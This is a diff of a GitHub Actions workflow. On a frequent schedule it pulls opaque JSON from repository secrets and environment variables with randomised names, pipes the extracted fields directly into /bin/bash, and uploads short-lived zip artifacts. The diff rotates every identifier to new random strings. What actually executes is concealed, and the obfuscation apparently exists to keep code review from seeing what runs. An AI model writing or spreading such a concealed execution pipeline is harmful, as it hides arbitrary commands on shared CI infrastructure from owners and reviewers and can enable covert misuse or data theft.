@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '16 1,7,13,19 * * *'
+    - cron: '26 5,11,17,23 * * *'
 permissions:
   contents: read
 jobs:
@@ -16,17 +16,15 @@ jobs:
           fetch-depth: 1
       - name: Process
         env:
-          t1789: ${{ secrets.t1789 }}
+          eto8003: ${{ secrets.eto8003 }}
         run: |
-          printf '%s' "$t1789" | jq -r .zmawz37 | /bin/bash
-          echo $fcnmv20241 | jq -r .go51 | /bin/bash
-          printf '%s' "$cbz1" | jq -r .yaus86522 | /bin/bash
-          echo $xdevp22478 | jq -r .kkq15763 | /bin/bash
-          printf '%s' "$ioo4539" | jq -r .mjtr2587 | /bin/bash
+          printf '%s' "$eto8003" | jq -r .jlz285 | /bin/bash
+          printf '%s' "$srm3" | jq -r .t92 | /bin/bash
+          echo $sx87723 | jq -r .yz4736 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
         with:
-          name: Lv8CZto0
+          name: zoInm3rA
           path: "*.zip"
           retention-days: 1
